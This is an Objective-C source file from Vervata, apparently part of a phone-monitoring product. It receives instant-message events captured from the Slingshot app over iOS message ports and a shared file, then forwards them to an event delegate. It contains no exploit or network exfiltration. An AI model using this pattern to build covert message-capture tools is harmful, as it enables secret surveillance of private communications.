//
//  SlingshotCaptureManager.m
//  SlingshotCaptureManager
//
//  Created by Makara on 7/22/14.
//  Copyright (c) 2014 Vervata. All rights reserved.
//

#import "SlingshotCaptureManager.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxIMEventUtils.h"

#import <UIKit/UIKit.h>

@implementation SlingshotCaptureManager

@synthesize mEventDelegate;

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
	[self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture {
	DLog (@"Start capture Slingshot");
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kSlingshotMessagePort1
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
	if (!mMessagePortReader1) {
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kSlingshotMessagePort2
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
	}
	if (!mMessagePortReader2) {
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kSlingshotMessagePort3
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];
	}
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
		if (mSharedFileReader1 == nil) {
			mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kSlingshotMessagePort1
																		 withDelegate:self];
            [mSharedFileReader1 setMPollingInterval:7.0];
			[mSharedFileReader1 start];
		}
	}
}

- (void) stopCapture {
	DLog (@"Stop capture Slingshot");
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
    
    if (mSharedFileReader1 != nil) {
		[mSharedFileReader1 stop];
		[mSharedFileReader1 release];
		mSharedFileReader1 = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxIMEvent *imEvent = [unarchiver decodeObjectForKey:kIMMsgArchived];
	DLog(@"Slingshot - imEvent = %@", imEvent);
    [unarchiver finishDecoding];
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:imEvent];
		for (FxEvent *imStructureEvent in imStructureEvents) {
			DLog (@"Sending %@ ...", imStructureEvent);
			[mEventDelegate performSelector:@selector(eventFinished:)
                                 withObject:imStructureEvent];
		}
	}
	
	[unarchiver release];
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
	[self dataDidReceivedFromMessagePort:aRawData];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
